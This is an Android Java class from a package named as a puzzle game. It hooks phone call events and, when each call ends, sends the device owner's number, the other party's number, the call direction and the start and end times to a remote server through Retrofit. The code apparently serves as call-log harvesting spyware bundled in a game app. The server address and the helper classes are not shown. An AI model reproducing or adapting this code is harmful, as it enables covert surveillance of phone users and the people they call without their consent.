package com.bdfleet.puzzlegame;


import android.content.Context;
import android.util.Log;
import android.widget.Toast;

import com.bdfleet.puzzlegame.Model.CallRacord;
import com.bdfleet.puzzlegame.Retrofit.ResponseCallBack;
import com.bdfleet.puzzlegame.Retrofit.RetrofitClientInstance;

import okhttp3.ResponseBody;



public class CallReceiver extends PhonecallReceiver {

    @Override
    protected void onIncomingCallStarted(Context ctx, String number, String start) {
        super.onIncomingCallStarted(ctx, number, start);
    }

    @Override
    protected void onOutgoingCallStarted(Context ctx, String number, String start) {
        super.onOutgoingCallStarted(ctx, number, start);
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, String ownerNum, String number, String start, String end) {
        super.onIncomingCallEnded(ctx, ownerNum, number, start, end);
        Toast.makeText(ctx,"Other "+number+" Owner "+ownerNum+" In Call Start  "+start+" In Call End  "+end,Toast.LENGTH_LONG).show();

        sendData(ctx,1,ownerNum,number,start,end);
    }

    @Override
    protected void onOutgoingCallEnded(Context ctx, String ownerNum, String number, String start, String end) {
        super.onOutgoingCallEnded(ctx, ownerNum, number, start, end);
        Toast.makeText(ctx,"Other "+number+" Owner "+ownerNum+" Out Call Start  "+start+" Out Call End  "+end,Toast.LENGTH_LONG).show();
        sendData(ctx,2,ownerNum,number,start,end);
    }

    public void sendData(final Context context, int callType, String ownerNumber, String otherNumber, String startTime, String endTime)
    {
        CallRacord callRacord = new CallRacord(ownerNumber,otherNumber,callType,startTime,endTime);

        RetrofitClientInstance.DataPass(callRacord, new ResponseCallBack<ResponseBody>() {
            @Override
            public void onSuccess(ResponseBody data) {
                showToast(context,"send Data");

            }

            @Override
            public void onResponse(Throwable th) {
                showToast(context,th.getMessage()+"onResponse");
            }

            @Override
            public void onError(Throwable th) {
                showToast(context,th.getMessage()+"onError");
            }
        });
    }

    public void showToast(Context context, String text){
        Toast.makeText(context, text, Toast.LENGTH_LONG).show();
    }

}
